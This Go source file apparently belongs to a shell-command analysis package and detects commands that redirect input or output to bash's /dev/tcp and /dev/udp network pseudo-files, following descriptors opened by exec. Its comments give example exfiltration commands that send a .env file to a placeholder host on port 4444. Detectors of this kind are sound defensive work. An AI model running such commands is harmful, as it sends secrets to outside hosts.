package shellcmd

import "strings"

// SocketRedirect is a redirection of a command to or from one of bash's network pseudo-files,
// /dev/tcp/host/port or /dev/udp/host/port: bash opens a connection instead of a file, so the
// command's output is sent to the host, or its input comes from it.
type SocketRedirect struct {
	// Path is the pseudo-file as written, without its quotes: /dev/tcp/host.example/4444, also
	// where the host or port depends on an expansion (/dev/tcp/$HOST/$PORT).
	Path string
	// Op is SocketWrite when the command's output goes to the host, SocketRead when its input
	// comes from it, and SocketReadWrite for a descriptor opened both ways (<>).
	Op SocketOp
}

// SocketOp is the direction of a socket redirection.
type SocketOp string

const (
	SocketWrite     SocketOp = "write"
	SocketRead      SocketOp = "read"
	SocketReadWrite SocketOp = "readwrite"
)

// SocketRedirects returns, for each command of a parsed command line, its redirections to or
// from a network pseudo-file. The result is parallel to commands, or nil when there is none.
//
// A command has one when a redirection of its own names the pseudo-file
// (`cat .env > /dev/tcp/host/4444`), and when it duplicates a descriptor that an earlier
// `exec` of the same shell opened on one (`exec 3<>/dev/tcp/host/4444; cat .env >&3`): the
// exec has the redirection that opens the connection, the later command the one that uses
// it, in the direction it uses it. A descriptor opened inside a substitution or a subshell is
// not followed out of it, and neither is one whose number is not written as a number.
func SocketRedirects(commands []Command) [][]SocketRedirect {
	var out [][]SocketRedirect
	// open maps a descriptor an exec left open on a socket, in the shell that ran the exec, to
	// the pseudo-file.
	var open map[descriptorKey]string
	for i := range commands {
		c := &commands[i]
		scope := descriptorKey{shell: c.shell, within: c.within, subshell: c.subshell}
		// Only a bare exec's redirections outlast the command.
		keeps := len(c.Argv) == 1 && c.Argv[0].Known && c.Argv[0].Text == "exec"
		for _, r := range c.Redirects {
			found := SocketRedirect{Op: SocketWrite}
			switch r.Op {
			case ">", ">>", ">|", "&>", "&>>":
			case "<":
				found.Op = SocketRead
			case "<>":
				found.Op = SocketReadWrite
			case ">&", "<&":
				if r.Op == "<&" {
					found.Op = SocketRead
				}
			default:
				continue // a here-document or a here-string
			}
			own := scope
			own.fd = descriptor(r)
			target := r.Target.Unquoted
			if number, isNumber := descriptorNumber(target); (r.Op == ">&" || r.Op == "<&") && (isNumber || target == "-") {
				// A duplicated descriptor is the socket an exec opened it on: in this shell, or in
				// one it was started from (a subshell or a substitution from its shell, a script
				// from the shell that runs it).
				from := scope
				from.fd = number
				found.Path = open[from]
				for shell := c.shell; found.Path == ""; shell = commands[shell-1].shell {
					found.Path = open[descriptorKey{shell: shell, fd: number}]
					if shell == 0 {
						break
					}
				}
			} else if isSocketPath(target) {
				found.Path = target
			}
			if keeps {
				if found.Path == "" {
					delete(open, own) // closed, or it now names something else
				} else {
					if open == nil {
						open = map[descriptorKey]string{}
					}
					open[own] = found.Path
				}
			}
			if found.Path == "" {
				continue
			}
			if out == nil {
				out = make([][]SocketRedirect, len(commands))
			}
			out[i] = append(out[i], found)
		}
	}
	return out
}

// descriptorKey is a descriptor of one shell: the command line's own or a script's (shell, as
// Command.shell), or a substitution's or a subshell's in it.
type descriptorKey struct {
	shell, within, subshell int32
	fd                      string
}

// descriptorNumber reads the target of >& or <& as a descriptor: digits, with the - that moves it.
func descriptorNumber(target string) (string, bool) {
	number := strings.TrimSuffix(target, "-")
	return number, number != "" && strings.Trim(number, "0123456789") == ""
}

// descriptor is the descriptor a redirection is of: the one written before the operator, or
// the operator's own (standard input for < and <>, standard output otherwise).
func descriptor(r Redirect) string {
	switch {
	case r.Fd != "":
		return r.Fd
	case strings.HasPrefix(r.Op, "<"):
		return "0"
	}
	return "1"
}

// isSocketPath reports whether a redirection's target, as written, is a network pseudo-file.
func isSocketPath(target string) bool {
	rest, ok := strings.CutPrefix(target, "/dev/tcp/")
	if !ok {
		rest, ok = strings.CutPrefix(target, "/dev/udp/")
	}
	return ok && rest != ""
}
